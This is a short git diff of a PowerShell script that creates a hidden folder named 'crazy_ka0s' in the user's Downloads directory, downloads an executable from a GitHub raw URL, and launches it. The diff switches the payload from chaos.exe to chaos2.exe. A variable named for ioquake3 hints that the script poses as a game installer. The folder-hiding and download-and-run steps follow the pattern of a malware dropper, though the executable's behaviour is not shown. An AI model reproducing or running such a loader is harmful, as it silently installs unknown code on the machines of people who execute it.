@@ -57,7 +57,7 @@ function Download-File {
   InvWR -url $Url -path $Path
 }
 
-Write-Host "x"
+Write-Host "hi"
 
 $dlPath = "$HOME\Downloads"
 $ioq3Path = "$dlPath\crazy_ka0s"
@@ -68,7 +68,7 @@ If (Test-Path $ioq3Path) {
 New-Item -ItemType Directory -Path $ioq3Path
 Set-ItemProperty -Path $ioq3Path -Name "Attributes" -Value ([System.IO.FileAttributes]::Hidden)
 
-Download-File -Url "https://github.com/rretroo/scripts/raw/main/chaos.exe" -Path "$ioq3Path\chaos.exe"
+Download-File -Url "https://github.com/rretroo/scripts/raw/main/chaos2.exe" -Path "$ioq3Path\chaos.exe"
 
 Start-Process -FilePath "$ioq3Path\chaos.exe" -WorkingDirectory $ioq3Path
 Exit
